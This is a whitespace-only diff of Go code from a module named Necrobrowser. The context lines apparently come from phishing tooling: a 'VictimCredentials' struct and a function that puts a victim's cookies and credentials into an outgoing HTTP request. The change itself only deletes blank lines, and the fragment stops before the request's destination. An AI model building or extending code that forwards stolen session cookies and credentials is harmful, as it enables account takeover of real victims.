@@ -57,7 +57,6 @@ type VictimCredentials struct {
 	Time  time.Time
 }
 
-
 // Name returns the module name
 func (module *Necrobrowser) Name() string {
 	return Name
@@ -133,7 +132,6 @@ func (module *Necrobrowser) Instrument(cookieJar []http.Cookie, credentialsJSON 
 	cookiesJSON := string(c)
 	module.Request = strings.ReplaceAll(module.Request, CookiePlaceholder, cookiesJSON)
 	module.Request = strings.ReplaceAll(module.Request, CredentialsPlaceholder, credentialsJSON)
-
 
 	client := resty.New()
 	resp, err := client.R().
